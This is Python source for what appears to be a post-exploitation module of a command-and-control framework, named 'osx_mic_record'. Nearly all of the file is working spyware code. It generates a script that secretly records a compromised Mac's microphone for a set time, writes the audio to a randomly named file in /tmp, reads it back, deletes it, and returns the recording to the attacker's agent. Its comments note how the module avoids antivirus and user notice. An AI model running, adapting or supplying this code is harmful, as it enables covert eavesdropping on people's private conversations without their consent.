class Module:

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'osx_mic_record',

            # List of one or more authors for the module
            'Author': ['@s0lst1c3'],

            # More verbose multi-line description of the module
            'Description': ('Records audio through the MacOS webcam mic '
                            'by leveraging the Apple AVFoundation API.'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            #   no need to base64 return data
            'OutputExtension': 'caf',

            # True if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # The module language
            'Language' : 'python',

            # The minimum language version needed
            'MinLanguageVersion' : '2.6',

            # List of any references/other comments
            'Comments': [
                (
                    'Executed within memory, although recorded audio will '
                    'touch disk while the script is running. This is unlikely '
                    'to trip A/V, although a user may notice the audio file '
                    'if it stored in an obvious location.'
                ),
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to record audio from.',
                'Required'      :   True,
                'Value'         :   '',
            },
            'OutputDir': {
                'Description'   :   ('Directory on remote machine '
                                     'in recorded audio should be '
                                     'saved. (Default: /tmp)'),
                'Required'      :   False,
                'Value'         :   '/tmp',
            },
            'RecordTime': {
                'Description'   :   ('The length of the audio recording '
                                     'in seconds. (Default: 5)'),
                'Required'      :   False,
                'Value'         :   '5',
            }
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=''):

        record_time = self.options['RecordTime']['Value']
        output_dir = self.options['OutputDir']['Value']

        return '''
import objc
import objc._objc
import time
import sys
import random
import os

from string import ascii_letters
from Foundation import *
from AVFoundation import *

record_time = %s
output_dir = '%s'

if __name__ == '__main__':

    pool = NSAutoreleasePool.alloc().init()

    # construct audio URL
    output_file = ''.join(random.choice(ascii_letters) for _ in range(32))
    output_path = os.path.join(output_dir, output_file)
    audio_path_str = NSString.stringByExpandingTildeInPath(output_path)
    audio_url = NSURL.fileURLWithPath_(audio_path_str)

    # fix metadata for AVAudioRecorder
    objc.registerMetaDataForSelector(
        b"AVAudioRecorder",
        b"initWithURL:settings:error:",
        dict(arguments={4: dict(type_modifier=objc._C_OUT)}),
    )
    
    # initialize audio settings
    audio_settings = NSDictionary.dictionaryWithDictionary_({
        'AVEncoderAudioQualityKey' : 0,
        'AVEncoderBitRateKey' : 16,
        'AVSampleRateKey': 44100.0,
        'AVNumberOfChannelsKey': 2,
    })

    # create the AVAudioRecorder
    (recorder, error) = AVAudioRecorder.alloc().initWithURL_settings_error_(
                                        audio_url,
                                        audio_settings,
                                        objc.nil,
    )

    # bail if unable to create AVAudioRecorder
    if error is not None:
        NSLog(error)
        sys.exit(1)

    # record audio for record_time seconds
    recorder.record()
    time.sleep(record_time)
    recorder.stop()

    # retrieve content from output file then delete it
    with open(output_path, 'rb') as input_handle:
        captured_audio = input_handle.read()
    run_command('rm -f ' + output_path)

    # return captured audio to agent
    print captured_audio

    del pool
    
''' % (record_time, output_dir) # script
